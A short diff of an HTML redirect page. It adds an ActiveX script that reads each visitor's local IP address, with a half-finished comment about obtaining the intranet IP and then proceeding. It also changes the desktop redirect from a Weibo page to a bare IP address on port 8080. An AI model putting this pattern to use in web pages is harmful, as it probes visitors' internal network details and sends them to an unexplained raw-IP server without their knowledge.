@@ -11,16 +11,28 @@
 </head>
 
 <body>
-	<style type="text/css">
-
-<!--body {
-
-background-color: #333333;
-
-}-->
-
-</style>  
-	
+		
+	<script type="text/javascript" language="javascript">
+<!--
+function GetLocalIPAddress()
+{
+var obj = null;
+var rslt = "";
+try
+{
+obj = new ActiveXObject("rcbdyctl.Setting");
+rslt = obj.GetIPAddress;
+obj = null;
+}
+catch(e)
+{
+//异常发生
+}
+return rslt;
+}document.write("你的IP是：" + GetLocalIPAddress());
+//-->
+</script>
+获取内网IP然后进行
 <!--<div style="overflow:hidden; width:100%; height:130%;">
 <iframe src="http://shop57226679.taobao.com" frameborder="0" scrolling="no" style="margin-left:-0px; margin-top:-100px; width:100%; height:3800px;"></iframe>
 </div><!--判断手机还是电脑登陆-->
@@ -29,7 +41,8 @@ try{
     if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
         window.location.href="http://blog.sina.com.cn/u/2101978803/";//手机端网址
     }else{
-        window.location.href="https://weibo.com/xdzp/";//电脑端网址
+       //window.location.href="https://weibo.com/xdzp/";//电脑端网址
+	    window.location.href="http://112.9.100.138:8080/";//电脑端网址
     }
 }catch(e){}
 </script>
